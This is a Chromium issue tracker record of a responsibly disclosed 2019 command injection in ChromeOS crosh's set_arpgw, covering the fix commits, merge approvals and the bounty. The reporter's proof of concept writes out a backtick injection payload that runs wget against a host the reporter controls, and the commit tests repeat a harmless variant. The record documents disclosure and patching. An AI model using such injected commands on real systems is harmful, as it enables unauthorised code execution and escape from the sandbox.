# Security: Crosh privilege escalation / sandbox escape via command injection in set_arpgw 

| Field | Value |
|-------|-------|
| **Issue ID** | [40094689](https://issues.chromium.org/issues/40094689) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | OS>Systems |
| **Platforms** | ChromeOS |
| **Reporter** | tm...@acu.edu |
| **Assignee** | jo...@chromium.org |
| **Created** | 2019-04-21 |
| **Bounty** | $5,500.00 |

## Description

It is possible for an attacker to escape crosh on chromeOS/chromiumOS

The set_arpgw method, which is exposed in the default crosh configuration, does not properly validate nor double quote user input, allowing for arbitrary commands to be executed.

File for reference: https://chromium.googlesource.com/chromiumos/platform2/+/master/shill/bin/set_arpgw#62

POC:

1) Open a crosh shell
2) Type in: set_arpgw '`/usr/local/bin/wget${IFS}192.168.154.1/getThisFile2`;false' (' & ` required in my testing), replacing the IP address with one you control if you so choose to see the the request complete

Patch is attached, as is an image showing the command executing.

## Attachments

- [set_arpgw.patch](attachments/set_arpgw.patch) (application/octet-stream, 522 B)
- [POCImage.png](attachments/POCImage.png) (image/png, 22.3 KB)

## Timeline

### tm...@acu.edu (2019-04-21)

[Description Changed]

### es...@chromium.org (2019-04-22)

[Empty comment from Monorail migration]

### jo...@chromium.org (2019-04-29)

Thanks for the report!

### jo...@chromium.org (2019-04-29)

[Empty comment from Monorail migration]

[Monorail components: OS>Systems]

### jo...@chromium.org (2019-04-29)

Simon, Peter, FYI, another shell injection bug.

### jo...@chromium.org (2019-04-29)

[Empty comment from Monorail migration]

### jo...@chromium.org (2019-04-30)

[Empty comment from Monorail migration]

### jo...@chromium.org (2019-04-30)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-05-01)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromiumos/platform2/+/7a5bbd5d705b75c6429e693400fb3900bbc55449

commit 7a5bbd5d705b75c6429e693400fb3900bbc55449
Author: Jorge Lucangeli Obes <jorgelo@google.com>
Date: Wed May 01 18:03:03 2019

shill: Fix command injection in set_arpgw.

This is a selective revert of
https://chromium-review.googlesource.com/c/aosp/platform/system/connectivity/shill/+/681619,
plues some extra quoting.

BUG=chromium:954818
TEST=Without the patch:
TEST="set_arpgw `/usr/bin/yes`;false" in crosh will execute 'yes'.
TEST=With the patch:
TEST="set_arpgw `/usr/bin/yes`;false" in crosh will fail.
TEST="set_arpgw true"
TEST=dbus-send --system --print-reply --fixed --dest=org.chromium.flimflam / org.chromium.flimflam.Manager.GetProperties | grep Arp
TEST=See "true"

Change-Id: Iff2d0632eba2de560a93853516ab12ba32a605c3
Reviewed-on: https://chromium-review.googlesource.com/1588843
Commit-Ready: Jorge Lucangeli Obes <jorgelo@chromium.org>
Tested-by: Jorge Lucangeli Obes <jorgelo@chromium.org>
Reviewed-by: Jorge Lucangeli Obes <jorgelo@chromium.org>

[modify] https://crrev.com/7a5bbd5d705b75c6429e693400fb3900bbc55449/shill/bin/set_arpgw


### jo...@chromium.org (2019-05-01)

[Empty comment from Monorail migration]

### jo...@chromium.org (2019-05-03)

Why did I mark this 68, geez.

### sh...@chromium.org (2019-05-03)

This bug requires manual review: M75 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: benmason@(Android), kariahda@(iOS), geohsu@(ChromeOS), srinivassista@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mn...@chromium.org (2019-05-03)

[Empty comment from Monorail migration]

### jo...@chromium.org (2019-05-06)

Geo, another ping for merge request. Assigning to  you temporarily, feel free to re-assign to me once the merge request is resolved (either positively or negatively).

### ge...@google.com (2019-05-07)

Merge Approved for M75 ChromeOS

### ge...@google.com (2019-05-07)

[Empty comment from Monorail migration]

### jo...@chromium.org (2019-05-08)

Cherry pick is up at https://chromium-review.googlesource.com/c/chromiumos/platform2/+/1600441, will run a tryjob and then land.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-05-09)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromiumos/platform2/+/e0ed4ac16a0e66cd2498a443a6bbfde186779a3e

commit e0ed4ac16a0e66cd2498a443a6bbfde186779a3e
Author: Jorge Lucangeli Obes <jorgelo@google.com>
Date: Thu May 09 01:06:06 2019

shill: Fix command injection in set_arpgw.

This is a selective revert of
https://chromium-review.googlesource.com/c/aosp/platform/system/connectivity/shill/+/681619,
plues some extra quoting.

BUG=chromium:954818
TEST=Without the patch:
TEST="set_arpgw `/usr/bin/yes`;false" in crosh will execute 'yes'.
TEST=With the patch:
TEST="set_arpgw `/usr/bin/yes`;false" in crosh will fail.
TEST="set_arpgw true"
TEST=dbus-send --system --print-reply --fixed --dest=org.chromium.flimflam / org.chromium.flimflam.Manager.GetProperties | grep Arp
TEST=See "true"

Change-Id: Iff2d0632eba2de560a93853516ab12ba32a605c3
Reviewed-on: https://chromium-review.googlesource.com/1588843
Commit-Ready: Jorge Lucangeli Obes <jorgelo@chromium.org>
Tested-by: Jorge Lucangeli Obes <jorgelo@chromium.org>
Reviewed-by: Jorge Lucangeli Obes <jorgelo@chromium.org>
(cherry picked from commit 7a5bbd5d705b75c6429e693400fb3900bbc55449)
Reviewed-on: https://chromium-review.googlesource.com/c/chromiumos/platform2/+/1600441
Commit-Queue: Jorge Lucangeli Obes <jorgelo@chromium.org>

[modify] https://crrev.com/e0ed4ac16a0e66cd2498a443a6bbfde186779a3e/shill/bin/set_arpgw


### jo...@chromium.org (2019-05-09)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-05-09)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-05-13)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### na...@google.com (2019-05-13)

[Empty comment from Monorail migration]

### na...@google.com (2019-05-15)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### na...@google.com (2019-05-15)

Congrats the Panel decided to reward $5,000 + $500 patch reward for this report

### tm...@acu.edu (2019-05-15)

Awesome, thanks!

### na...@google.com (2019-05-15)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-05-17)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2019-08-15)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-07-14)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### br...@chromium.org (2020-07-14)

[Empty comment from Monorail migration]

### jo...@chromium.org (2021-03-23)

Hi Timothy,

Can I encourage you to file a new bug for that request? https://bugs.chromium.org/p/chromium/issues/entry?template=Security+Bug

You can provide more details in that bug.

### is...@google.com (2021-03-23)

This issue was migrated from crbug.com/chromium/954818?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40094689)*
